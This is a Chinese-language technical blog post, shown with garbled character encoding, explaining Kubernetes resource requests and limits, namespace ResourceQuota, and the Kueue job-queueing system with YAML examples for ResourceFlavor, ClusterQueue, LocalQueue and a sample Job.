pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä¸Šæ–‡ä½¿ç”¨koordinatoræ¼”ç¤ºgang-schedulingå’Œbinpackè°ƒåº¦ï¼Œ å·²ç»ç”Ÿæ•ˆã€‚</p>
<p>4ä¸ª2å¡Podé¾Ÿç¼©åœ¨ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¦å¤–ä¸€ä¸ª2å¡Podè¢«æŒ¤åˆ°å¦å¤–ä¸€ä¸ªèŠ‚ç‚¹ï¼ˆæ¯èŠ‚ç‚¹ä¸Šè™šæ‹Ÿgpuï¼š8å¡ï¼‰ã€‚</p>
<p>æ­¤æ—¶æˆ‘ä»¬å†å°è¯•ç”³è¯·8å¡ä½œä¸šï¼Œpodä¼š<code>PendingçŠ¶æ€</code>ã€‚ä½†ä¸€æ—¦èŠ‚ç‚¹æœ‰èµ„æºï¼Œpodå°±ä¼šè‡ªåŠ¨è¿›å…¥<code>RunningçŠ¶æ€</code>ã€‚</p>
<p>è¿™å°±æ˜¯resource.requests/limits è½¯è°ƒåº¦çš„æ•ˆæœã€‚</p>
<h2 data-id="heading-0">1. resource.requests/limits è½¯è°ƒåº¦</h2>
<p>ä¸Šé¢çš„è°ƒåº¦ä¸»è¦ç”±<code>requests</code>é…ç½®æ¥çº¦æŸã€‚</p>
<p><code>requests</code>ï¼š æ˜¯â€œæ‰¿è¯ºèµ„æºâ€ï¼Œ <code>kube-scheduler</code>å°†requests cpuï¼š1 çš„podè°ƒåº¦åˆ°æŸä¸ªnodeï¼Œ å°±ç›¸å½“äºä»è¯¥nodeèµ„æºæ± ä¸Šåˆ’èµ°äº†æœ‰ä¸€éƒ¨åˆ†èµ„æºï¼Œè¿™1æ ¸ä¼šè¢«é¢„å®šï¼Œä¸å†æ‰¿è¯ºç»™å…¶ä»–podï¼Œå³ä½¿ä½ è¿™ä¸ªpodåªç”¨äº†500mæ ¸ã€‚</p>
<p><code>limits</code>:  æ˜¯èµ„æºä½¿ç”¨çš„ä¸Šé™ï¼Œæ˜¯ç”±<code>kubelet</code>æ¥å¼ºåˆ¶æ‰§è¡Œã€‚</p>
<h2 data-id="heading-1">2. k8såŸç”Ÿé…é¢ResourceQuotaï¼š ç¡¬éš”ç¦»</h2>
<p>å½“å¤šä¸ªå›¢é˜Ÿå…±äº«k8sé›†ç¾¤èŠ‚ç‚¹èµ„æºæ—¶ï¼Œ ä¼šæœ‰æŸä¸€ç§Ÿæˆ·éœ¸å å¤§é‡èµ„æºçš„å¯èƒ½æ€§ã€‚</p>
<p>èµ„æºé…é¢å°±æ˜¯ç”¨æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼š</p>
<p>èµ„æºé…é¢<strong>ä½œç”¨åœ¨å‘½åç©ºé—´ä¸Šï¼ˆå‘½åç©ºé—´å¤©ç”Ÿå°±æ˜¯å¤šç§Ÿæˆ·æ¦‚å¿µçš„è½½ä½“ï¼‰ï¼Œ é™åˆ¶äº†è¯¥ç§Ÿæˆ·ï¼ˆå‘½åç©ºé—´ï¼‰èƒ½åˆ›å»ºçš„èµ„æºå¯¹è±¡(+åŸºç¡€è®¾æ–½èµ„æº)çš„ä¸Šé™</strong>ï¼Œ è¿™ä¸ªé™åˆ¶æ˜¯é€šè¿‡api serveråœ¨èµ„æºå¯¹è±¡å±‚é¢åšåˆ°çš„ã€‚</p>
<p>ResourceQuota ç›¸å½“äºæ¡†å®šæŸä¸€ç±»èµ„æºçš„å¯ç”¨ä¸Šé™ï¼Œ æœ‰â€œèµ„æºç±»å‹â€ã€â€é…é¢ä½œç”¨åŸŸâ€œ ç­‰è¿‡æ»¤èµ„æºçš„é€‰é¡¹ï¼Œ å…·ä½“è¯·å‚è§<a href="https://link.juejin.cn?target=https%3A%2F%2Fkubernetes.io%2Fzh-cn%2Fdocs%2Fconcepts%2Fpolicy%2Fresource-quotas%2F%23quota-and-cluster-capacity" target="_blank" title="https://kubernetes.io/zh-cn/docs/concepts/policy/resource-quotas/#quota-and-cluster-capacity" ref="nofollow noopener noreferrer">ResouceQoutaå®˜æ–¹</a>ã€‚</p>
<p>ä¸‹é¢ç»™å‡ºä¸€ä¸ªåŒ…å«[åŸºç¡€è®¾æ–½èµ„æºã€æ‰©å±•èµ„æºã€èµ„æºå¯¹è±¡]çš„ResourceQuotaï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">ResourceQuota</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">mem-cpu-demo</span>
<span class="hljs-attr">spec:</span>
  <span class="hljs-attr">hard:</span>
    <span class="hljs-attr">requests.cpu:</span> <span class="hljs-string">"1"</span>
    <span class="hljs-attr">requests.memory:</span> <span class="hljs-string">1Gi</span>   <span class="hljs-comment"># éœ€æ±‚æ€»é‡</span>
    <span class="hljs-attr">limits.cpu:</span> <span class="hljs-string">"2"</span>
    <span class="hljs-attr">limits.memory:</span> <span class="hljs-string">2Gi</span>      <span class="hljs-comment"># é™é¢æ€»é‡</span>
    <span class="hljs-attr">requests.example.com/dongle:</span> <span class="hljs-number">2</span>
    
    <span class="hljs-attr">pods:</span> <span class="hljs-string">"4"</span>
    <span class="hljs-attr">replicationcontrollers:</span> <span class="hljs-string">"20"</span>
    <span class="hljs-attr">secrets:</span> <span class="hljs-string">"10"</span>
    <span class="hljs-attr">services:</span> <span class="hljs-string">"10"</span>
</code></pre>
<blockquote>
<p>å› ä¸ºæ‰©å±•èµ„æºä¸å¯è¶…é‡åˆ†é…ï¼Œæ•…æ²¡æœ‰å¿…è¦ä¸ºæ‰©å±•èµ„æºåŒæ—¶æŒ‡å®šrequestså’Œlimitsé…ç½®ï¼Œåªéœ€æŒ‡å®šrequests.xxxx å³å¯ã€‚</p>
</blockquote>
<p>å› ä¸ºé…é¢çš„å‡†å…¥æ˜¯åœ¨apiserver èµ„æºå¯¹è±¡å±‚é¢ï¼Œ æ‰€ä»¥å½“é…é¢ä¸è¶³ï¼Œä¸ä¼šäº§ç”Ÿpodå¤„äºpendingçš„ç°è±¡ï¼Œkubectlå‘½ä»¤ä¼šç»™å‡ºæŠ¥é”™ï¼š<code>pods "quota-mem-cpu-demo-2" is forbidden: exceeded quota</code>ï¼Œ è¿™ç‚¹ä¸resource.requests/limits è½¯è°ƒåº¦ä¸åŒã€‚</p>
<blockquote>
<p>æç¤ºï¼š<br/>
ResourceQuota ä¸é›†ç¾¤èµ„æºæ€»é‡æ˜¯å®Œå…¨ç‹¬ç«‹çš„ã€‚å®ƒä»¬é€šè¿‡ç»å¯¹çš„å•ä½æ¥é…ç½®ã€‚<br/>
æ‰€ä»¥ï¼Œä¸ºé›†ç¾¤æ·»åŠ èŠ‚ç‚¹æ—¶ï¼Œk8sèµ„æºé…é¢ä¸ä¼šè‡ªåŠ¨èµ‹äºˆæ¯ä¸ªå‘½åç©ºé—´æ¶ˆè€—æ›´å¤šèµ„æºçš„èƒ½åŠ›ã€‚</p>
</blockquote>
<h2 data-id="heading-2">3. kueue ä»»åŠ¡é˜Ÿåˆ—</h2>
<p>ä¸Šæ–‡k8såŸç”ŸresourceQuota æ˜¯å‘½åç©ºé—´çº§åˆ«çš„ç¡¬èµ„æºé™åˆ¶ï¼Œâ€œå®ƒåªè´Ÿè´£é™åˆ¶ï¼Œ ä¸è´Ÿè´£è°ƒåº¦â€ã€‚</p>
<p>åœ¨ä¼ä¸šçº§å¤šç§Ÿæˆ·äº‘ç¯å¢ƒä¸­ï¼Œä¸ºäº†â‘ é«˜æ•ˆâ‘¡çµæ´» åˆ©ç”¨é›†ç¾¤èµ„æºï¼Œ éœ€è¦â€œåè°ƒå’Œè°ƒåº¦â€çš„èƒ½åŠ›ã€‚</p>
<p>kueue è¿™ç§ä»»åŠ¡é˜Ÿåˆ—å°±æ˜¯è¿™ä¸ªä½œç”¨ï¼Œå®ƒä¸è°‹æ±‚æ›¿ä»£k8såŸç”Ÿç»„ä»¶ä½œç”¨ï¼Œå·¥ä½œåœ¨k8såŸç”Ÿè°ƒåº¦å™¨ä¹‹ä¸Šã€‚</p>
<p>kueueæ˜¯k8sä¸Šç®¡ç†èµ„æºæ± é…é¢å’Œç®¡æ§jobæ¶ˆè´¹èµ„æºæ± é…é¢çš„ä»»åŠ¡é˜Ÿåˆ—ç³»ç»Ÿï¼Œ
kueueå†³å®šäº†jobä»€ä¹ˆæ—¶å€™åº”è¯¥ç­‰å¾…ï¼Œä»€ä¹ˆæ—¶å€™è¢«å‡†å…¥ï¼Œä»€ä¹ˆæ—¶å€™jobå¯ä»¥è¢«æŠ¢å ã€‚</p>
<p>ä»€ä¹ˆæ—¶å€™ä½¿ç”¨kueueï¼Ÿ</p>
<p>â‘   éœ€è¦å¼¹æ€§è®¡ç®—èµ„æº(å¯éšæ—¶æ‰©ç¼©å®¹)</p>
<p>â‘¡  è®¡ç®—èµ„æºæ˜¯å¼‚æ„èµ„æºï¼ˆæ¶æ„ã€å¯ç”¨æ€§ã€ä»·æ ¼ç­‰å› ç´ ï¼‰</p>
<p>è¿™é‡Œæˆ‘ç”¨è‡ªå·±çš„æƒ³æ³•ååŠ©å¤§å®¶ç†è§£è¿™â‘ â‘¡ç‚¹ï¼š</p>
<p>kueueä¸­æ„å»ºçš„clusterQueueå¼•ç”¨çš„èµ„æºæ± é…é¢æ˜¯é€»è¾‘é…é¢ï¼Œ èµ„æºå¯ä»¥è·¨é˜Ÿåˆ—æµåŠ¨ ï¼ˆå€Ÿç”¨ã€æŠ¢å ï¼‰ï¼Œ è™½ç„¶å’Œk8såŸç”Ÿé…é¢ä¸€æ ·éƒ½ä¸ä¸ç¡¬ä»¶èµ„æºç›´æ¥æŒ‚é’©ï¼Œä½†å¾ˆæ˜æ˜¾ç›¸æ¯”k8såŸç”Ÿé…é¢æ›´å…·å¼¹æ€§ã€‚</p>
<p>åŒæ„èµ„æºæŒ‡çš„æ˜¯æ‰€æœ‰è®¡ç®—èŠ‚ç‚¹/è®¾å¤‡è§„æ ¼ç›¸åŒï¼Œ å¼‚æ„èµ„æºæ˜¯æŒ‡è®¡ç®—èŠ‚ç‚¹/è®¾å¤‡è§„æ ¼/ç‰¹æ€§ä¸åŒã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9bb368709efd4ad78f609149ee9059e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766379206&amp;x-signature=zrgbYIlWIHzu9QJL3NK%2FOPo70yU%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>ä¸ºä»€ä¹ˆä¼šå­˜åœ¨å¼‚æ„èµ„æºï¼Ÿ<br/>
ç”±ä¸šåŠ¡éœ€æ±‚é©±åŠ¨äº§ç”Ÿçš„ä¸åŒè®¾å¤‡å½¢æ€ï¼ˆAI/MLå·¥ä½œè´Ÿè½½ã€è¾¹ç¼˜è®¡ç®—ã€ç§‘å­¦è®¡ç®—ç­‰è¦æ±‚çš„è®¾å¤‡ç§ç±»ã€è®¾å¤‡è§„æ ¼ã€è®¾å¤‡ä¾§é‡éƒ½ä¸åŒï¼‰ï¼Œ è¡ç”Ÿå‡ºè®¾å¤‡ä»·æ ¼ä¹Ÿä¸åŒã€‚</p>
</blockquote>
<hr/>
<p>ä¸‹å›¾æ˜¯kueueçš„ä½œç”¨åŸç†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9ad7cdbf5c4a4e0ab2b7c9a5969f8ca5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766379206&amp;x-signature=8nI3Zhx%2FbVQVbJU0CNPcgEuC38Q%3D" alt="" loading="lazy"/></p>
<p>ä»»åŠ¡æ»¡è¶³èµ„æºæ± é…é¢ï¼Œè¢«å‡†å…¥åï¼š</p>
<ul>
<li>kueueä¿®æ”¹jobçš„ suspendï¼š falseï¼Œ æ”¾è¡Œjob</li>
<li>kueue å‘jobæ³¨å…¥nodeselectoræ³¨è§£ï¼Œå°†æœ¬æ¬¡èµ„æºé£å‘³ç›¸å…³çš„ä¿¡æ¯ç»™åˆ°jobï¼Œç”¨äºåç»­è°ƒåº¦ï¼ï¼ï¼</li>
</ul>
<h3 data-id="heading-3">3.1 èµ„æºé«˜åº¦æŠ½è±¡</h3>
<p>ä¸Šé¢çš„resource.requests/limits å’Œk8såŸç”ŸresourceQuota éƒ½æ²¡èƒ½è·³è„±worker èŠ‚ç‚¹èµ„æºçš„æ¦‚å¿µã€‚</p>
<p>kueueå°†workerèŠ‚ç‚¹ä¸Šçš„èµ„æºæŠ½è±¡æˆç”±ç‰¹å®šèµ„æºé£å‘³ï¼ˆResourceFlavorï¼‰è¡¨å¾çš„èµ„æºæ± ï¼Œ æ¡†å®šäº†æŸä¸€ç±»å«æœ‰ç‰¹å®šèµ„æºç±»å‹/è§„æ ¼çš„èŠ‚ç‚¹ã€‚</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">kueue.x-k8s.io/v1beta2</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">ResourceFlavor</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">"default-flavor"</span>
<span class="hljs-attr">spec:</span>
  <span class="hljs-attr">nodeLabels:</span>
    <span class="hljs-attr">gpu:</span> <span class="hljs-string">h20</span> <span class="hljs-comment">#  æ¡†å®šäº†å«h20çš„èŠ‚ç‚¹</span>
</code></pre>
<p>ä¸Šé¢åä¸º<code>default-flavor</code>çš„èµ„æºé£å‘³ æ¡†å®šäº†å¸¦æœ‰<code>gpu:h20</code>æ ‡ç­¾çš„èŠ‚ç‚¹</p>
<blockquote>
<p>å¦‚æœæ˜¯åŒæ„èµ„æºï¼Œä½ ä¹Ÿå¯ä»¥å®šä¹‰empty resource flavorã€‚</p>
</blockquote>
<hr/>
<p>ç„¶ååŸºäºæ¡†å®šçš„èµ„æºæ± ç»™æŸä¸ªä»»åŠ¡é˜Ÿåˆ—åˆ†å‘èµ„æºé…é¢ã€‚</p>
<h3 data-id="heading-4">3.2 èµ„æºæ± çš„é…é¢ nominalQuota</h3>
<p>ClusterQueue é»˜è®¤æ˜¯é›†ç¾¤çº§åˆ«çš„å¯¹è±¡ï¼Œå®šä¹‰äº†é›†ç¾¤ä¸­æŸç±»èµ„æºé£å‘³çš„é…é¢ã€‚</p>
<p>ä¸‹é¢ä¸º<code>cluster-queue</code>çš„å…¨å±€é˜Ÿåˆ—ï¼ˆä¾æ‰˜äºâ€œdefault-flavorâ€èµ„æºæ± ï¼‰å®šä¹‰äº†ä½¿ç”¨é…é¢, å…¶ä¸­ä¸ºç¨€ç¼ºèµ„æº<code>example.com/dongle</code>çº¦æŸ10å¡ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">kubectl label nodes minikube-m02/minikube-m03 <span class="hljs-attr">gpu</span>=h20 å‡è®¾èŠ‚ç‚¹æœ‰è¿™æ ·çš„æ ‡ç­¾
</code></pre>
<p>å‘½åç©ºé—´<code>team-a</code>çš„localQueueå¼•ç”¨äº†è¯¥clusterQueueã€‚</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">kueue.x-k8s.io/v1beta2</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">ResourceFlavor</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">default-flavor</span> <span class="hljs-comment">##  å¯¹åŒæ„èµ„æºï¼Œå®šä¹‰emptyèµ„æºé£å‘³</span>
  <span class="hljs-attr">spec:</span>
  <span class="hljs-attr">nodeLabels:</span>
    <span class="hljs-attr">gpu:</span> <span class="hljs-string">h20</span> <span class="hljs-comment">#  æ¡†å®šäº†å«h20æ ‡ç­¾çš„èŠ‚ç‚¹</span>
<span class="hljs-meta">---</span>
<span class="hljs-attr">apiVersion:</span> <span class="hljs-string">kueue.x-k8s.io/v1beta2</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">ClusterQueue</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">"cluster-queue"</span>
<span class="hljs-attr">spec:</span>
  <span class="hljs-attr">namespaceSelector:</span> {} <span class="hljs-comment"># match all.</span>
  <span class="hljs-attr">resourceGroups:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">coveredResources:</span> [<span class="hljs-string">"cpu"</span>, <span class="hljs-string">"memory"</span>, <span class="hljs-string">"pods"</span>]
    <span class="hljs-attr">flavors:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"default-flavor"</span>
      <span class="hljs-attr">resources:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"cpu"</span>
        <span class="hljs-attr">nominalQuota:</span> <span class="hljs-number">10</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"memory"</span>
        <span class="hljs-attr">nominalQuota:</span> <span class="hljs-string">10Gi</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"example.com/dongle"</span>
        <span class="hljs-attr">nominalQuota:</span> <span class="hljs-number">10</span>
<span class="hljs-meta">---</span>
<span class="hljs-attr">apiVersion:</span> <span class="hljs-string">kueue.x-k8s.io/v1beta2</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">LocalQueue</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">namespace:</span> <span class="hljs-string">team-a</span> 
  <span class="hljs-attr">name:</span> <span class="hljs-string">team-a-queue</span>
<span class="hljs-attr">spec:</span>
  <span class="hljs-attr">clusterQueue:</span> <span class="hljs-string">cluster-queue</span> 
</code></pre>
<p>clusterQueueä¸localQueueçš„å¼•ç”¨å…³ç³»å®ç°äº†å…±äº«å…¨å±€èµ„æºæ± çš„ç†å¿µã€‚</p>
<p>å½¢æˆçš„å¯¹è±¡æ˜ å°„å…³ç³»å¦‚ä¸‹ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9b975ea78d240d4b5ffbecfeb2fd2f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766379206&amp;x-signature=Ov3piDjuQ1F%2BSf0PgEyXvdbAAkA%3D" alt="" loading="lazy"/>
æµ…ç»¿è‰²æ˜¯kueueäº§ç”Ÿçš„å¯¹è±¡ï¼Œæµ…è“è‰²æ˜¯ç”¨æˆ·å®é™…æäº¤çš„æ‰¹å¤„ç†ä»»åŠ¡ã€‚</p>
<hr/>
<p>ä¸‹é¢ç”¨ä¸€ä¸ªk8såŸç”Ÿjobæ¥æ¼”ç¤º kueueçš„å·¥ä½œè¡¨ç°ã€‚</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">batch/v1</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">Job</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">pi3</span>
  <span class="hljs-attr">labels:</span>
    <span class="hljs-attr">kueue.x-k8s.io/queue-name:</span> <span class="hljs-string">team-a-queue</span>
<span class="hljs-attr">spec:</span>
  <span class="hljs-attr">parallelism:</span> <span class="hljs-number">3</span> <span class="hljs-comment"># å¹¶è¡Œæ‰§è¡Œæ¬¡æ•°ï¼Œé»˜è®¤ä¸º1</span>
  <span class="hljs-attr">completions:</span> <span class="hljs-number">3</span> <span class="hljs-comment"># å®Œæˆæ¬¡æ•°ï¼Œé»˜è®¤ä¸ºparallelismçš„å€¼</span>
 <span class="hljs-comment"># suspend: true </span>
  <span class="hljs-attr">template:</span>
    <span class="hljs-attr">spec:</span>
      <span class="hljs-attr">containers:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">pi</span>
        <span class="hljs-attr">image:</span> <span class="hljs-string">perl</span>
        <span class="hljs-attr">imagePullPolicy:</span> <span class="hljs-string">IfNotPresent</span>
        <span class="hljs-attr">command:</span> [ <span class="hljs-string">"perl"</span>, <span class="hljs-string">"-Mbignum=bpi"</span>, <span class="hljs-string">"-wle"</span>, <span class="hljs-string">"print bpi(5000)"</span> ]
        <span class="hljs-attr">resources:</span>
          <span class="hljs-attr">requests:</span>
            <span class="hljs-attr">cpu:</span> <span class="hljs-string">"1"</span>
            <span class="hljs-attr">memory:</span> <span class="hljs-string">"200Mi"</span>
            <span class="hljs-attr">example.com/dongle:</span> <span class="hljs-string">"2"</span>
          <span class="hljs-attr">limits:</span>
            <span class="hljs-attr">cpu:</span> <span class="hljs-string">"1"</span>
            <span class="hljs-attr">memory:</span> <span class="hljs-string">"200Mi"</span>
            <span class="hljs-attr">example.com/dongle:</span> <span class="hljs-string">"2"</span>
      <span class="hljs-attr">restartPolicy:</span> <span class="hljs-string">Never</span>

<span class="hljs-comment"># Job ä»£è¡¨ä¸€æ¬¡æ€§ä»»åŠ¡ï¼Œè¿è¡Œå®Œæˆåˆ°åœæ­¢ï¼Œå®ƒå°†Ï€è®¡ç®—åˆ°5000ä¸ªä½ç½®å¹¶å°†å…¶æ‰“å°å‡ºæ¥ã€‚å®Œæˆå¤§çº¦éœ€è¦60ç§’ã€‚ ä¹‹åpodçŠ¶æ€æ˜¯ Completed</span>
</code></pre>
<ul>
<li><del>è¿™é‡Œæœ€é‡è¦çš„æ˜¯é…ç½®æ˜¯jobä¸­çš„"suspend:true"ï¼Œ jobåº”è¯¥ä»¥æŒ‚èµ·çŠ¶æ€è¢«åˆ›å»º</del>ï¼Œç”±kueueæ¥å†³å®šä½•æ—¶å¯åŠ¨, ä¸éœ€è¦è¿™ä¸ªsuspendï¼štrueé…ç½®ï¼ŒåŠ ä¸Šäº†kueue.x-k8s.io/queue-name: team-a-queueå°±èƒ½å—kueueç®¡æ§ã€‚</li>
<li>åœ¨åŸç”Ÿjobæ ‡ç­¾å…³è”localqueue</li>
</ul>
<p>æäº¤ç¬¬ä¸€ä¸ªä»»åŠ¡ï¼Œ3ä¸ªPodå ç”¨äº†6å¡ï¼›
å†ç«‹åˆ»å¯åŠ¨åŒæ ·é…ç½®çš„ç¬¬äºŒä¸ªä»»åŠ¡ï¼Œå—localqueueä¸­<code>nominalQuota: 10</code>çš„çº¦æŸï¼Œä»»åŠ¡2ä¼špendingï¼Œ</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37da41605f8e4b6a95d68a5c03405b74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766379206&amp;x-signature=I253Oa8v1AJI4Sx0HSRxAoaopFc%3D" alt="image.png" loading="lazy"/></p>
<p>ç­‰å¾…ä»»åŠ¡1æ‰§è¡Œå®Œï¼Œé‡Šæ”¾äº†<code>example.com/dongle</code>èµ„æºï¼Œæœ€åè¿›å…¥runingçŠ¶æ€è·‘å®Œä»»åŠ¡ï¼Œåˆ†åˆ«æŸ¥çœ‹ä»»åŠ¡1å’Œä»»åŠ¡2çš„å‡†å…¥äº‹ä»¶ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/72ca9910c93d4bf296a39aeb5776fdd7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766379206&amp;x-signature=znv9RNI80IWyyYg8spGeXgHySrc%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/429682515bb94e5c8d8c8809c45e4a04~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766379206&amp;x-signature=T0ZFfEX7wQZ9zQWyeFz5j%2FaO%2Fg4%3D" alt="image.png" loading="lazy"/></p>
<p>æœ€åæˆ‘ä»¬çœ‹ä¸‹ä¸šåŠ¡jobè¢«kueueä¿®æ”¹çš„ç»“æœã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/93eb6c384be84c47af177c9daa5d82b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766379206&amp;x-signature=qgPlNKg8N7f1ESGfrZpjSxIXCGg%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fkueue.sigs.k8s.io%2Fzh-cn%2Fdocs%2Foverview%2F" target="_blank" title="https://kueue.sigs.k8s.io/zh-cn/docs/overview/" ref="nofollow noopener noreferrer">kueue è¿˜æœ‰å¾ˆå¤šç‰¹æ€§</a>,è¯»è€…è‡ªè¡Œå®¡é˜…ï¼Œä¿®è¡Œåœ¨ä¸ªäººã€‚</p>
<p>â‘  æ ¸å¿ƒçš„clusterqueueé»˜è®¤çš„æ’é˜Ÿç­–ç•¥æ˜¯ï¼š BestEffortFIFOï¼š å…ˆæŒ‰ä¼˜å…ˆçº§æ’åºï¼Œå†æŒ‰ç…§åˆ›å»ºæ—¶é—´ï¼›æœªè¢«å‡†å…¥çš„æ—§ä»»åŠ¡ä¸ä¼šå½±å“åç»­èƒ½è¢«å‡†å…¥çš„æ–°æ¥ä»»åŠ¡ã€‚</p>
<p>â‘¡ æ”¯æŒé˜Ÿåˆ—ç»„Cohortï¼Œ å¯å®ç°èµ„æºå¼¹æ€§å€Ÿç”¨</p>
<p>â‘¢ æ³¨æ„é˜Ÿåˆ—ç»„ã€clusterqueueä¸èµ„æºé£å‘³çš„1å¯¹å¤šçš„å…³ç³»ã€‚
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d61ec15be1c4cbba2fdb3f60dff91ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766379206&amp;x-signature=b5YToDEOkcT7r9dlXP%2BgGdqc8oY%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>åœ¨ä¼ä¸šçº§å¤šç§Ÿæˆ·ã€å¼ºèµ„æºç”Ÿäº§éš”ç¦»ã€è®¡è´¹è¦æ±‚çš„èƒŒæ™¯ä¸‹ï¼Œä¸€èˆ¬æ˜¯ç‹¬ç«‹clusterQueue ä¸ å…±äº«ClusterQueueç»“åˆçš„åšæ³•ã€‚</p>
</blockquote>
<h2 data-id="heading-5">4. æ€»ç»“</h2>
<p>ä»Šå¤©ä¸»è¦åœ¨è°ƒåº¦è¿™ä¸ªèŠ±å›­é‡Œé¢æŒ–å‘€æŒ–ï¼Œ æ›´å‡†ç¡®çš„æ˜¯èšç„¦åœ¨â€œå‡†å…¥â€è¿™ä¸ªåŠ¨ä½œä¸Šå±•å¼€æ€è·¯ã€‚</p>
<p>k8såŸç”Ÿèµ„æºé…é¢çš„ç›®çš„ï¼šä¸æ˜¯ä¸ºäº†ä¼˜åŒ–è°ƒåº¦ï¼Œè€Œæ˜¯åœ¨å¤šç§Ÿæˆ·èƒŒæ™¯ä¸‹ï¼Œçº¦æŸèµ„æºçš„ç¡¬ä½¿ç”¨è¾¹ç•Œã€‚
ResourceQuota æ¡†å®šäº†å‘½åç©ºé—´ä¸­æŸäº›èµ„æºçš„äº§ç”Ÿä¸Šé™ï¼›</p>
